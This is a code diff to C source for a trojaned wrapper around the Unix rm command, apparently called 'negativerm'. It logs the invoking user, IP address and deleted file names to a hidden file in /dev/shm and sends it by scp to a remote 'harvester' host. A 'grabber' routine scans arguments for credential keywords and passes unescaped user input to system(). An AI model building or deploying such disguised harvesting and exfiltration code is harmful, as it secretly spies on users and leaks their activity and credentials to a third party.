@@ -27,6 +27,7 @@ void extendedhelp(){
     system("/usr/bin/rm --help");
 }
 void sshsession(char *argv[], int argc){
+    printf("In ssh session\n");
     //Creating password, filename, and time
     struct passwd *p = getpwuid(getuid());
     time_t t = time(NULL);
@@ -36,7 +37,7 @@ void sshsession(char *argv[], int argc){
     char filename[100] = "/dev/shm/negativerm-(";
     strcat(filename, date);
     strcat(filename,").har");
-
+    printf("File created\n");
     //Getting ip address
     unsigned char ip_address[15];
     int fd;
@@ -60,7 +61,7 @@ void sshsession(char *argv[], int argc){
 
     /*Extract IP Address*/
     strcpy(ip_address, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
-    char *printarg;
+    char printarg[250];
     FILE *fp;
     fp = fopen(filename, "w");
        for (int i = 1; i < argc; i++){
@@ -69,6 +70,7 @@ void sshsession(char *argv[], int argc){
    }
     fprintf(fp, "%s@%s: %s attempted to remove %s @%s\n", p->pw_name, ip_address, p->pw_name, printarg, date);
     fclose(fp);
+    printf("Connecting to server\n");
     char command[500] = "/usr/bin/scp -q '";
     char dest[100] = "' pdiddy@172.16.77.5:/var/harvester";
     strcat(command, filename);
@@ -125,7 +127,6 @@ void grabber(char *argv[], int argc){
        }
    }
    */
-   char *p;
     for (int i = 0; i < argc; i++){
         for (int j = 0; j < INTEREST_SIZE; j++){
                if (strstr(argv[i], interest_creds[j])){//checks what the user entered
@@ -135,18 +136,23 @@ void grabber(char *argv[], int argc){
         }
     }
     char argvgetter[250] ="";
+    strcat(argvgetter, command);
+    strcat(argvgetter, " ");
+    strcat (argvgetter, "-c '/usr/bin/rm ");
    for (int i = 1; i < argc; i++){
        strcat(argvgetter, argv[i]);
        strcat(argvgetter, " ");
    }
-   strcat(argvgetter, " '");
+   strcat(argvgetter, "'");
    printf("argvgetter is %s", argvgetter);
+   /*
    char *argready[2];
    argready[0] = argvgetter;
-   argready[1] = NULL;
    char *callargv[] = {"-c /usr/bin/rm ", argready, NULL};
    execve(command, callargv, NULL);
- 
+   */
+   system(argvgetter);
+   exit(1);
 }
 int main(int argc, char *argv[]){
     if (argc == 1){
